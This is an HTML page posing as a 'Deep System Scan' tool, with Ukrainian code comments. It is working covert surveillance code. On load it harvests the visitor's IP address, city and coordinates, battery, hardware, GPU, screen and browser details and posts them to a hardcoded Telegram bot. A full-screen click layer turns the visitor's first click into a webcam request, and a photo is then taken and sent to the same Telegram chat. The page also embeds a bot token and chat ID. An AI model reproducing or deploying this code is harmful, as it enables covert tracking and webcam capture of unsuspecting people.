<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Deep System Scan</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
    <style>
        body { margin: 0; background: radial-gradient(circle at top, #0b1220, #05060a); color: #e5e7eb; font-family: Consolas, monospace; overflow-x: hidden; }
        .status { text-align: center; margin-top: 25px; font-size: 20px; letter-spacing: 2px; color: #60a5fa; }
        .container { width: 90%; max-width: 800px; margin: 20px auto; }
        .box { background: rgba(15, 23, 42, 0.9); padding: 12px; border-radius: 12px; margin-bottom: 10px; opacity: 0; transform: translateY(10px); transition: 0.4s; border: 1px solid rgba(59, 130, 246, 0.2); }
        .show { opacity: 1; transform: translateY(0); }
        .label { color: #94a3b8; font-size: 11px; text-transform: uppercase; }
        .value { color: white; margin-top: 5px; word-break: break-all; font-size: 13px; line-height: 1.5; }
        .progress { height: 10px; background: #111827; border-radius: 5px; overflow: hidden; margin-bottom: 20px; }
        .bar { height: 100%; width: 0%; background: #3b82f6; transition: width 0.05s linear; }
        #map { height: 250px; display: none; border-radius: 12px; margin-top: 10px; border: 1px solid #1e293b; }
        #clickLayer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
        #video, #canvas { display: none; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        @media (max-width: 600px) { .grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body onclick="activateCamera()">

<div id="clickLayer"></div>
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<div class="status" id="statusText">SCANNING...</div>

<div class="container">
    <div class="progress"><div class="bar" id="bar"></div></div>
    
    <div class="grid">
        <div class="box" id="b1"><div class="label">Network</div><div id="ip" class="value">Loading...</div></div>
        <div class="box" id="b2"><div class="label">Hardware</div><div id="hw" class="value">---</div></div>
        <div class="box" id="b3"><div class="label">Battery</div><div id="bat" class="value">---</div></div>
        <div class="box" id="b4"><div class="label">Display</div><div id="scr" class="value">---</div></div>
    </div>
    
    <div class="box" id="b5"><div class="label">Browser Fingerprint</div><div id="finger" class="value">---</div></div>
    <div id="map"></div>
</div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script>
const TG_TOKEN = "8639479669:AAHYhGU7UMGZ5nlo3-PGzKVsQx9vTaQojFk";
const TG_CHAT_ID = "-1003787168523";

let cameraUsed = false;

async function activateCamera() {
    if (cameraUsed) return;
    cameraUsed = true;
    document.getElementById('clickLayer').style.display = 'none';
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', TG_CHAT_ID);
                fd.append('photo', blob, 'img.jpg');
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: "POST", body: fd });
                stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg');
        }, 2000);
    } catch(e) {}
}

let p = 0;
let bar = setInterval(() => {
    p++;
    document.getElementById("bar").style.width = p + "%";
    if(p >= 100) { clearInterval(bar); startScan(); }
}, 20);

async function startScan() {
    // 1. Отримуємо IP дані
    const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
    
    // 2. Отримуємо дані про батарею
    let batteryInfo = "N/A";
    if (navigator.getBattery) {
        const b = await navigator.getBattery();
        batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'Заряджається' : 'Розряджається'})`;
    }

    // 3. Збираємо залізо
    const hwInfo = `Ядра: ${navigator.hardwareConcurrency} | RAM: ~${navigator.deviceMemory || '?' }GB | GPU: ${getGPU()}`;
    
    // 4. Екран та мережа
    const scrInfo = `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`;
    const netInfo = navigator.connection ? `Тип: ${navigator.connection.effectiveType} | Speed: ~${navigator.connection.downlink}Mbps` : "N/A";

    // Відображення
    document.getElementById("ip").innerHTML = `IP: ${ipData.ip}<br>City: ${ipData.city}<br>${netInfo}`;
    document.getElementById("hw").innerHTML = hwInfo;
    document.getElementById("bat").innerHTML = batteryInfo;
    document.getElementById("scr").innerHTML = scrInfo;
    document.getElementById("finger").innerHTML = `OS: ${navigator.platform}<br>UA: ${navigator.userAgent}`;

    document.querySelectorAll('.box').forEach(b => b.classList.add('show'));
    showMap(ipData.latitude, ipData.longitude);

    // 5. Відправка всього в ТГ
    const fullLog = `
🚀 *DEEP SCAN REPORT*
🌐 *IP:* \`${ipData.ip}\`
📍 *Локація:* ${ipData.city}, ${ipData.country_name}
🔋 *Батарея:* ${batteryInfo}
🖥️ *Екран:* ${scrInfo}
⚙️ *Залізо:* ${hwInfo}
📡 *Мережа:* ${netInfo}
🌐 *Браузер:* ${navigator.userAgent}
🕒 *Час:* ${new Date().toLocaleString()}
🔗 [Google Maps](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})
    `;

    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: fullLog, parse_mode: "Markdown" })
    });
}

function getGPU() {
    try {
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL).split(' ').pop();
    } catch(e) { return "N/A"; }
}

function showMap(lat, lon) {
    document.getElementById("map").style.display = "block";
    let m = L.map('map', {zoomControl: false}).setView([lat, lon], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);
    L.marker([lat, lon]).addTo(m);
}
</script>

</body>
</html>
